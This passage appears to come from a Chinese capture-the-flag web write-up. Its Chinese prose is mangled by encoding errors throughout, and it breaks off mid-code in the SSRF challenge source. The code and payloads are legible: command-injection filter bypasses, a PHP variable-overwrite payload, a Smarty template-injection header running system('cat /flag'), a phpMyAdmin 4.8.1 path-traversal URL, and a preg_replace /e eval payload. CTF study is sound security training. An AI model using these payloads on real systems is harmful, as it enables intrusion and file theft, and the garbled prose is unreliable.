&lt;pre tabindex="0"&gt;&lt;code&gt;?cmd=uniq%20/flag
POST
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&amp;amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¯»æ–‡ä»¶çš„ç»•è¿‡æœ‰&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style="text-align: center"&gt;1&lt;/th&gt;
&lt;th&gt;more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;2&lt;/td&gt;
&lt;td&gt;less:ä¸ more ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æ›´å¥½çš„æ˜¯ï¼Œä»–å¯ä»¥[pg dn][pg up]ç¿»é¡µ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;3&lt;/td&gt;
&lt;td&gt;head:æŸ¥çœ‹å¤´å‡ è¡Œ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;4&lt;/td&gt;
&lt;td&gt;tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;5&lt;/td&gt;
&lt;td&gt;tail:æŸ¥çœ‹å°¾å‡ è¡Œ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;6&lt;/td&gt;
&lt;td&gt;nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;7&lt;/td&gt;
&lt;td&gt;od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;8&lt;/td&gt;
&lt;td&gt;vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;9&lt;/td&gt;
&lt;td&gt;vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;10&lt;/td&gt;
&lt;td&gt;sort:å¯ä»¥æŸ¥çœ‹&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;11&lt;/td&gt;
&lt;td&gt;uniq:å¯ä»¥æŸ¥çœ‹&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;12&lt;/td&gt;
&lt;td&gt;file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/blockquote&gt;
&lt;p&gt;æ‘˜è‡ª&lt;a class="link" href="https://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener"
&gt;å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨åŠç»•è¿‡æ–¹å¼æ€»ç»“&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bjdctf2020mark-loves-cat"&gt;[BJDCTF2020]Mark loves cat
&lt;/h1&gt;&lt;p&gt;gitæ³„éœ²&lt;/p&gt;
&lt;p&gt;flag.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$flag = file_get_contents(&amp;#39;/flag&amp;#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;index.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
include &amp;#39;flag.php&amp;#39;;
$yds = &amp;#34;dog&amp;#34;;
$is = &amp;#34;cat&amp;#34;;
$handsome = &amp;#39;yds&amp;#39;;
foreach($_POST as $x =&amp;gt; $y){
$$x = $y;
}
foreach($_GET as $x =&amp;gt; $y){
$$x = $$y;
}
foreach($_GET as $x =&amp;gt; $y){
if($_GET[&amp;#39;flag&amp;#39;] === $x &amp;amp;&amp;amp; $x !== &amp;#39;flag&amp;#39;){
exit($handsome);
}
}
if(!isset($_GET[&amp;#39;flag&amp;#39;]) &amp;amp;&amp;amp; !isset($_POST[&amp;#39;flag&amp;#39;])){
exit($yds);
}
if($_POST[&amp;#39;flag&amp;#39;] === &amp;#39;flag&amp;#39; || $_GET[&amp;#39;flag&amp;#39;] === &amp;#39;flag&amp;#39;){
exit($is);
}
echo &amp;#34;the flag is: &amp;#34;.$flag;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å°è¯•è¾“å‡º&lt;code&gt;$flag&lt;/code&gt;å³å¯ã€‚exit()å‡½æ•°é€€å‡ºæ—¶ä¹Ÿä¼šè¾“å‡ºã€‚&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€ä¸ªä¸å¯èƒ½å®ç°ï¼Œå¦‚æœPOSTæˆ–GETä¼ å…¥flagçš„è¯å¿…ç„¶å¯¼è‡´&lt;code&gt;$flag&lt;/code&gt;ä¿®æ”¹ï¼Œé‚£ä¹ˆæ­£å¥½ç¬¦åˆç¬¬äºŒä¸ªifã€‚&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GET
?yds=flag
POST(ä»»æ„ï¼Œä½†æ˜¯éœ€è¦ä¿è¯ä¸ä¼ flag)
is=233flag
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="bjdctf2020the-mystery-of-ip"&gt;[BJDCTF2020]The mystery of ip
&lt;/h1&gt;&lt;p&gt;hint.phpé‡Œé¢æœ‰æ³¨é‡Š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Do you know why i know your ip?&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;å»flag.phpå°è¯•åŠ å…¥è¯·æ±‚å¤´x-forward-xã€client-ipå‘ç°ipå¯ä»¥æ”¹å˜ã€‚ç„¶åæ˜¯è‡ªå·±æ„Ÿè§‰ç½‘é¡µå¾ˆç®€å•ï¼Œçªç ´ç‚¹åœ¨è¯·æ±‚å¤´ä¸­ï¼Œå°è¯•äº†ä¸‹sstiæ¨¡æ¿æ³¨å…¥ï¼Œå‘ç°æˆåŠŸäº†ã€‚&lt;/p&gt;
&lt;p&gt;å°è¯•äº†å‡ ä¸ªsstiçš„payloadä¸è¡Œï¼Œä½†æ˜¯æç¤ºäº†&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Uncaught &amp;ndash;&amp;gt; Smarty Compiler:&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;å¾—çŸ¥äº†è¿™ä¸ªæ˜¯Smartyå¼•æ“ï¼Œåœ¨ç½‘ä¸Šå°è¯•æœç´¢è¿™ç§ç±»å‹çš„æ³¨å…¥&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;è¯·æ±‚ï¼š
X-Forwarded-For: {system(&amp;#39;cat /flag&amp;#39;)}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a class="link" href="https://github.com/epinna/tplmap" target="_blank" rel="noopener"
&gt;SSTIç¥å™¨â€“Tplmap&lt;/a&gt;ï¼Œçœ‹ä»‹ç»æ˜¯å’Œsqlmapå·®ä¸å¤šçš„å·¥å…·ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªå¸ˆå‚…çš„åšå®¢å†™çš„å¾ˆå…¨ï¼šhttps://www.cnblogs.com/R3col/p/12746485.htmlï¼Œæ‰€æœ‰ç±»å‹çš„æ¨¡æ¿å¼•æ“payloadéƒ½æœ‰ï¼Œæ³¨å…¥ä¹‹å‰éœ€è¦å…ˆç¡®å®šç±»å‹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.cnblogs.com/20175211lyz/p/11425368.html" target="_blank" rel="noopener"
&gt;CTF SSTI(æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://xz.aliyun.com/t/3679/" target="_blank" rel="noopener"
&gt;flaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="gwctf-2019æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"&gt;[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“
&lt;/h1&gt;&lt;p&gt;é¡µé¢æ˜¯ä¹±ç ï¼Œæƒ³çŸ¥é“å†…å®¹äº†å¯ä»¥çœ‹ä¸‹å›¾&lt;/p&gt;
&lt;p&gt;$$å„ç§ä¹±ç å›¾&lt;/p&gt;
&lt;p&gt;å¯¹ç…§çš„æ˜¯å¤æ–‡ç ã€‚æ˜¯ä»¥GBKæ–¹å¼è¯»å–UTF-8ç¼–ç çš„ä¸­æ–‡ï¼Œæˆ‘ä¸¾ä¸ªä¾‹å­ï¼Œä½¿ç”¨vscodeï¼Œå…ˆé€šè¿‡ç¼–ç ä¿å­˜&amp;ndash;&amp;gt;GBKï¼Œå†é€šè¿‡ç¼–ç æ‰“å¼€&amp;ndash;&amp;gt;UTF-8ã€‚å†…å®¹å¦‚ä¸‹&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“ï¼Œä½†é‡Œé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰~
ä¸ä¿¡ä½ æ‰¾&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;æç¤ºæ˜¯æ•°æ®åº“äº†ï¼Œé‚£ä¹ˆæœæ–­å°è¯•PHPmyadminï¼Œè®¿é—®æˆåŠŸï¼Œç„¶åæŸ¥çœ‹ä¸‹ç‰ˆæœ¬ï¼Œå»ç½‘ä¸Šæœç´¢å¯¹åº”ç‰ˆæœ¬çš„æ¼æ´&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.secpulse.com/archives/72817.html" target="_blank" rel="noopener"
&gt;phpmyadmin4.8.1åå°getshell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/phpmyadmin/index.php?target=db_sql.php%253f../../../../../../flag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¯ä»¥åŒ…å«ä»»æ„æ–‡ä»¶ï¼Œç†åº”å¯ä»¥åŒ…å«æ•°æ®åº“æ–‡ä»¶ï¼Œåœ¨æ•°æ®åº“è¡¨å­—æ®µå†™shellï¼Œæ²¡æˆä¸çŸ¥é“æ•°æ®åº“æ–‡ä»¶åç§°&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="20210301"&gt;2021.03.01
&lt;/h1&gt;&lt;hr&gt;
&lt;h1 id="bjdctf2020zjctfä¸è¿‡å¦‚æ­¤"&gt;[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤
&lt;/h1&gt;&lt;p&gt;ç»•è¿‡&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€å±‚ç”¨phpä¼ªåè®®ä¸­çš„dataå°è£…æµã€‚&lt;a class="link" href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener"
&gt;PHPä¼ªåè®®æ€»ç»“&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åè¿›å…¥æ–‡ä»¶åŒ…å«ï¼Œæç¤ºåŒ…å«next.phpæ–‡ä»¶ï¼Œè¿˜æ˜¯ä½¿ç”¨phpä¼ªåè®®ä¸­çš„php://filter&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?text=data://text/plain,I have a dream&amp;amp;file=php://filter/convert.base64-encode/resource=next.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¯»å‡ºæ¥çš„next.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;base64è§£ç ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$id = $_GET[&amp;#39;id&amp;#39;];
$_SESSION[&amp;#39;id&amp;#39;] = $id;
function complex($re, $str) {
return preg_replace(
&amp;#39;/(&amp;#39; . $re . &amp;#39;)/ei&amp;#39;,
&amp;#39;strtolower(&amp;#34;\\1&amp;#34;)&amp;#39;,
$str
);
}
foreach($_GET as $re =&amp;gt; $str) {
echo complex($re, $str). &amp;#34;\n&amp;#34;;
}
function getFlag(){
@eval($_GET[&amp;#39;cmd&amp;#39;]);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¿™é‡Œæƒ³è¦é€šè¿‡éœ€è¦çŸ¥é“ä¸€ä¸ª&lt;a class="link" href="http://www.xinyueseo.com/websecurity/158.html" target="_blank" rel="noopener"
&gt;æ·±å…¥ç ”ç©¶ preg_replace /e æ¨¡å¼ä¸‹çš„ä»£ç æ¼æ´é—®é¢˜&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æœ€ç»ˆpayload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;next.php?\S*=${getFlag()}&amp;amp;cmd=system(&amp;#39;cat /flag&amp;#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="de1ctf-2019ssrf-me"&gt;[De1CTF 2019]SSRF Me
&lt;/h1&gt;&lt;p&gt;è¿›å…¥é¡µé¢æ˜¯ä¸€å †æºç ï¼Œä¹‹å‰å†™è¿‡flaskçš„å¯ä»¥å¤§æ¦‚ç†å‡ºæ¥å‡ ä¸ªé‡è¦çš„ç‚¹ï¼Œä½†æ˜¯è¿˜æ˜¯è´´ä¸€ä¸‹æºç &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#! /usr/bin/env python&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# encoding=utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; flask &lt;span style="color:#f92672"&gt;import&lt;/span&gt; Flask
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; flask &lt;span style="color:#f92672"&gt;import&lt;/span&gt; request
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; socket
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; hashlib
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; urllib
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; sys
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; os
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; json
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;reload(sys)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sys&lt;span style="color:#f92672"&gt;.&lt;/span&gt;setdefaultencoding(&lt;span style="color:#e6db74"&gt;&amp;#39;latin1&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;app &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Flask(__name__)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;secert_key &lt;span style="color:#f92672"&gt;=&lt;/span&gt; os&lt;span style="color:#f92672"&gt;.&lt;/span&gt;urandom(&lt;span style="color:#ae81ff"&gt;16&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Task&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__init__&lt;/span&gt;(self, action, param, sign, ip):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;action &lt;span style="color:#f92672"&gt;=&lt;/span&gt; action
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;param &lt;span style="color:#f92672"&gt;=&lt;/span&gt; param
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sign &lt;span style="color:#f92672"&gt;=&lt;/span&gt; sign
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sandbox &lt;span style="color:#f92672"&gt;=&lt;/span&gt; md5(ip)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;not&lt;/span&gt; os&lt;span style="color:#f92672"&gt;.&lt;/span&gt;path&lt;span style="color:#f92672"&gt;.&lt;/span&gt;exists(self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sandbox)): &lt;span style="color:#75715e"&gt;# SandBox For Remote_Addr&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; os&lt;span style="color:#f92672"&gt;.&lt;/span&gt;mkdir(self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sandbox)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Exec&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;500&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;checkSign()):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;scan&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;in&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;action:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; tmpfile &lt;span style="color:#f92672"&gt;=&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#34;./&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;/result.txt&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sandbox, &lt;span style="color:#e6db74"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; resp &lt;span style="color:#f92672"&gt;=&lt;/span&gt; scan(self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;param) &lt;span style="color:#75715e"&gt;# æ­¤å¤„æ˜¯æ–‡ä»¶è¯»å–å¾—æ³¨å…¥ç‚¹&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (resp &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Connection Timeout&amp;#34;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; resp
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print resp
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; tmpfile&lt;span style="color:#f92672"&gt;.&lt;/span&gt;write(resp)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; tmpfile&lt;span style="color:#f92672"&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;read&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;in&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;action:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; f &lt;span style="color:#f92672"&gt;=&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#34;./&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;/result.txt&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sandbox, &lt;span style="color:#e6db74"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; f&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;500&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Action Error&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;500&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;msg&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Sign Error&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; result
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;checkSign&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (getSign(self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;action, self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;param) &lt;span style="color:#f92672"&gt;==&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sign):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
